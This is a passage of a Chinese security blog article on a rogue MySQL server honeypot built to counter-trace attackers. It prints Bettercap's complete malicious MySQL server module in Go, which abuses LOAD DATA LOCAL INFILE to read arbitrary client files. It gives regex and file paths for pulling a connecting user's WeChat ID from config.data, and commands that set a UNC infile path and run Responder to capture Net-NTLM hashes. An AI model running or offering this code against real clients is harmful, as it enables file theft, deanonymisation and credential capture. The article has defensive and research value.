version=4, #生成二维码尺寸的大小 1-40 1:21*21（21+(n-
1)*4）
error_correction=qrcode.constants.ERROR_CORRECT_M, #L:7%
M:15% Q:25% H:30%
box_size=10, #每个格子的像素大小
border=2, #边框的格子宽度大小
)
qr.add_data(str)
qr.make(fit=True)
img=qr.make_image()
img.save(save)
# 读取到的wxid
wxid = ''
qr_id = 'weixin://contacts/profile/' + wxid
make_qr(qr_id,'demo.jpg')
这样，我们组合上面的过程，就可以通过正则首先获得用户username
re.findall( r'.*C:\\Users\\(.*?)\\AppData\\Local\\.*', result)
之后再将获得的username进行拼接，获取到攻击者的微信配置文件：
C:\Users\{username}\Documents\WeChat Files\All
Users\config\config.data
最后再正则获得其中的wxid，并且利用上述函数转换为二维码即可，这样当攻
击者扫描到我们的蜜罐之后，进行连接，我们就可以抓取到攻击者的wxid，并
生成二维码了。
至此，我们构建的蜜罐已经将攻击者的微信给我们带回来了。
NTLM HASH
我们知道，NTLM认证采用质询/应答的消息交换模式，流程如下：
1. 客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会
提前存储登录用户名和对应的密码hash；
2. 服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challen
ge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，
获得Challenge1；
3. 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，
获得Challenge2(这个结果被称为response)，将response发送给服务器
；
4. 服务器接收客户端加密后的response，比较Challenge1和response，如
果相同，验证成功。
在以上流程中，登录用户的密码hash即NTLM hash，response中包含Net-
NTLM
hash，而对于SMB协议来说，客户端连接服务端的时候，会优先使用本机的用
户名和密码hash来进行登录尝试，而INFILE又支持UNC路径，组合这两点我们
就能通过构造一个恶意的MySQL服务器，Bettercap本身已经集成了一个恶意M
ySQL服务器，代码如下：
package mysql_server
import (
"bufio"
"bytes"
"fmt"
"io/ioutil"
"net"
"strings"
"github.com/bettercap/bettercap/packets"
"github.com/bettercap/bettercap/session"
"github.com/evilsocket/islazy/tui"
)
type MySQLServer struct {
session.SessionModule
address *net.TCPAddr
listener *net.TCPListener
infile string
outfile string
}
func NewMySQLServer(s *session.Session) *MySQLServer {
mod := &MySQLServer{
SessionModule: session.NewSessionModule("mysql.server", s),
}
mod.AddParam(session.NewStringParameter("mysql.server.infile",
"/etc/passwd",
"",
"File you want to read. UNC paths are also supported."))
mod.AddParam(session.NewStringParameter("mysql.server.outfile",
"",
"",
"If filled, the INFILE buffer will be saved to this path
instead of being logged."))
mod.AddParam(session.NewStringParameter("mysql.server.address",
session.ParamIfaceAddress,
session.IPv4Validator,
"Address to bind the mysql server to."))
mod.AddParam(session.NewIntParameter("mysql.server.port",
"3306",
"Port to bind the mysql server to."))
mod.AddHandler(session.NewModuleHandler("mysql.server on", "",
"Start mysql server.",
func(args []string) error {
return mod.Start()
}))
mod.AddHandler(session.NewModuleHandler("mysql.server off",
"",
"Stop mysql server.",
func(args []string) error {
return mod.Stop()
}))
return mod
}
func (mod *MySQLServer) Name() string {
return "mysql.server"
}
func (mod *MySQLServer) Description() string {
return "A simple Rogue MySQL server, to be used to exploit
LOCAL INFILE and read arbitrary files from the client."
}
func (mod *MySQLServer) Author() string {
return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
}
func (mod *MySQLServer) Configure() error {
var err error
var address string
var port int
if mod.Running() {
return session.ErrAlreadyStarted(mod.Name())
} else if err, mod.infile =
mod.StringParam("mysql.server.infile"); err != nil {
return err
} else if err, mod.outfile =
mod.StringParam("mysql.server.outfile"); err != nil {
return err
} else if err, address =
mod.StringParam("mysql.server.address"); err != nil {
return err
} else if err, port = mod.IntParam("mysql.server.port"); err
!= nil {
return err
} else if mod.address, err = net.ResolveTCPAddr("tcp",
fmt.Sprintf("%s:%d", address, port)); err != nil {
return err
} else if mod.listener, err = net.ListenTCP("tcp",
mod.address); err != nil {
return err
}
return nil
}
func (mod *MySQLServer) Start() error {
if err := mod.Configure(); err != nil {
return err
}
return mod.SetRunning(true, func() {
mod.Info("server starting on address %s", mod.address)
for mod.Running() {
if conn, err := mod.listener.AcceptTCP(); err != nil {
mod.Warning("error while accepting tcp connection: %s",
err)
continue
} else {
defer conn.Close()
// TODO: include binary support and files > 16kb
clientAddress :=
strings.Split(conn.RemoteAddr().String(), ":")[0]
readBuffer := make([]byte, 16384)
reader := bufio.NewReader(conn)
read := 0
mod.Info("connection from %s", clientAddress)
if _, err := conn.Write(packets.MySQLGreeting); err !=
nil {
mod.Warning("error while writing server greeting: %s",
err)
continue
} else if _, err = reader.Read(readBuffer); err != nil {
mod.Warning("error while reading client message: %s",
err)
continue
}
// parse client capabilities and validate connection
// TODO: parse mysql connections properly and
// display additional connection attributes
capabilities := fmt.Sprintf("%08b",
(int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))
loadData := string(capabilities[8])
username := string(bytes.Split(readBuffer[36:],
[]byte{0})[0])
mod.Info("can use LOAD DATA LOCAL: %s", loadData)
mod.Info("login request username: %s",
tui.Bold(username))
if _, err := conn.Write(packets.MySQLFirstResponseOK);
err != nil {
mod.Warning("error while writing server first response
ok: %s", err)
continue
} else if _, err := reader.Read(readBuffer); err != nil
{
mod.Warning("error while reading client message: %s",
err)
continue
} else if _, err :=
conn.Write(packets.MySQLGetFile(mod.infile)); err != nil {
mod.Warning("error while writing server get file
request: %s", err)
continue
} else if read, err = reader.Read(readBuffer); err !=
nil {
mod.Warning("error while readind buffer: %s", err)
continue
}
if strings.HasPrefix(mod.infile, "\\") {
mod.Info("NTLM from '%s' relayed to %s",
clientAddress, mod.infile)
} else if fileSize := read - 9; fileSize < 4 {
mod.Warning("unexpected buffer size %d", read)
} else {
mod.Info("read file ( %s ) is %d bytes", mod.infile,
fileSize)
fileData := readBuffer[4 : read-4]
if mod.outfile == "" {
mod.Info("\n%s", string(fileData))
} else {
mod.Info("saving to %s ...", mod.outfile)
if err := ioutil.WriteFile(mod.outfile, fileData,
0755); err != nil {
mod.Warning("error while saving the file: %s",
err)
}
}
}
conn.Write(packets.MySQLSecondResponseOK)
}
}
})
}
func (mod *MySQLServer) Stop() error {
return mod.SetRunning(false, func() {
defer mod.listener.Close()
})
}
通过查阅文档，我们可以看到相关参数的设置如下：
我们这里将我们的mysql.server.infile设置成UNC路径。
set mysql.server.infile \\192.168.165.128\test; mysql.server on
并且通过responder进行监听。
responder --interface eth0 -i 192.168.231.153
当攻击者使用客户端连接我们的恶意服务器时，
我们就成功的截获了NTLM的相关信息。
参考连接
1. https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg
2. https://www.bettercap.org/modules/ethernet/servers/mysql.serve
r/
3. https://www.colabug.com/2019/0408/5936906/
4. https://github.com/bettercap/bettercap
5. http://russiansecurity.expert/2016/04/20/mysql-connect-file-
read/
6. https://lightless.me/archives/read-mysql-client-file.html
精选留言
用户设置不下载评论